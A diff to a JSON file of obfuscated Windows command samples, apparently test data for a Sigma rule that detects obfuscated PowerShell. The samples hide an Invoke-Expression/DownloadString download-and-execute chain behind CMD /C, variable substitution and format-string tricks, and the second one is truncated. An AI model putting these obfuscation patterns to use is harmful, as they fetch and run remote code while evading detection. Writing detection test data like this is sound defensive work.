@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "CMD /C \"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString && Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f 'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" ) && CMD /C%mXI%\"",
@@ -9,4 +8,6 @@
     "explanation": "This command is a more complex obfuscated PowerShell invocation using multiple layers of string manipulation, variable substitution, and encoded execution. It includes multiple string format placeholders ({0}, {1}, etc.) and CMD /C, which are all key indicators in the Sigma rule."
   },
   {
-    "output": "CMD /C \"set VAR1=Invoke-Expression && set VAR2=(New-Object Net.WebClient).DownloadString && set VAR3=PowerShell.exe && set VAR4=\\\"{2}{1}{0}\\\" && set VAR5=\\\"{0}{1}\\\" && set VAR6=\\\"{0}{1}\\\" && set VAR7=\\\"{2}{5}{0}{1}{6}{4}{3}\\\" && %VAR1% %VAR2% && %VAR3% -Command %VAR4
+    "output": "CMD /C \"set VAR1=Invoke-Expression && set VAR2=(New-Object Net.WebClient).DownloadString && set VAR3=PowerShell.exe && set VAR4=\\\"{2}{1}{0}\\\" && set VAR5=\\\"{0}{1}\\\" && set VAR6=\\\"{0}{1}\\\" && set VAR7=\\\"{2}{5}{0}{1}{6}{4}{3}\\\" && %VAR1% %VAR2% && %VAR3% -Command %VAR4"
+  }
+]
